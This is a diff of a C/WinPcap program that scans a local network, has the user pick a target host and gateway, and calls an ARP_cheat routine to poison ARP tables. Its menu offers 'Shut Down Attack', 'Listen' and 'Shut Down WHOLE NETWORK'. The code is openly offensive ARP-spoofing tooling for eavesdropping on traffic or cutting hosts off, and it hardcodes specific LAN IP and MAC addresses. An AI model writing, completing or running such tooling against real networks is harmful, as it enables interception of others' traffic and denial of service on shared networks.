@@ -2,6 +2,9 @@
 #include <stdio.h>
 #include <pcap.h>
 #include "Headers.h"
+char *myIP= "10.2.124.31";
+char *myMAC="78-45-C4-B8-12-CE";
+char * myPhoneMAC="1c:b0:94:bc:0c:f0";
 char ARP_TABLE[100][2][30]={
 	"10.2.124.2"     ,    "d8-49-0b-b8-4a-1b"
 	,"10.2.124.3"     ,    "d8-49-0b-b8-4a-1b"
@@ -119,6 +122,7 @@ pcap_if_t * find_interfaces(){
 pcap_t * openDevice(pcap_if_t * device,unsigned int package_size){
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t * fp=pcap_open(device->name,65535,PCAP_OPENFLAG_PROMISCUOUS,1000,NULL,errbuf);
+	//pcap_t * fp=pcap_open_live(device->name,65535,0,1000,errbuf);
 	if(fp == NULL)
 	{
 		fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", device->name);
@@ -149,9 +153,26 @@ int main(){
 	unsigned int package_size=sizeof(MACHeader)+sizeof(IPHeader)+sizeof(ICMPHeader);
 	char * pData=new char[package_size];
 	pcap_t * fp=openDevice(alldevs,package_size);
+	HostManager manager;
 	//ARP_cheat(fp,getIP("10.2.124.34"),getIP("10.2.124.1"),getMAC("1c:b0:94:bc:0c:f1"),getMAC("1c:b0:94:bc:0c:f0"),getMAC("d8:49:0b:b8:4a:1b"));
-	ARP_cheat(fp,getIP("10.2.124.34"),getIP("10.2.124.1"),getMAC("78-45-C4-B8-12-CE"),getMAC("1c:b0:94:bc:0c:f0"),getMAC("d8:49:0b:b8:4a:1b"));
-	//HostScan(fp,getIP("10.2.124.96"),temp_ip,getMAC("78-45-C4-B8-12-CE"));
+	//ARP_cheat(fp,getIP("10.2.124.34"),getIP("10.2.124.1"),getMAC("78-45-C4-B8-12-CE"),getMAC("1c:b0:94:bc:0c:f0"),getMAC("d8:49:0b:b8:4a:1b"));
+	HostScan(fp,manager,getIP(myIP),temp_ip,getMAC(myMAC));
+	SetColor(3);
+	int phone_idx=manager.getHostByMAC(getMAC(myPhoneMAC));
+	printf("My HTC Phone's ID:%d\n",phone_idx);
+	Host * target_host=&manager.host_list[manager.selectHost("Please Select Your TARGET:")];
+	Host * gate_host=&manager.host_list[manager.selectHost("Please Select Your GATEWAY/ROUTER:")];
+	SetColor(5); 
+	char tmp_ip[20];
+	IP_toString(target_host->IP,tmp_ip);
+	printf("TARGET:%s\n",tmp_ip);
+	SetColor(2);
+	printf("1.Shut Down Attack\n2.Listen\n3.Shut Down WHOLE NETWORK\n");
+	int command_ID;
+	scanf("%d",&command_ID);
+	ARP_cheat(fp,target_host->IP,gate_host->IP,getMAC(myMAC),target_host->mac,gate_host->mac);
+	//ARP_cheat(fp,getIP("10.2.124.34"),getIP("10.2.124.1"),getMAC("78-45-C4-B8-12-CE"),getMAC("1c:b0:94:bc:0c:f0"),getMAC("d8:49:0b:b8:4a:1b"));
+
 	//SetFilter(fp,"arp and ether dst 78:45:C4:B8:12:CE");
 	
 	/*
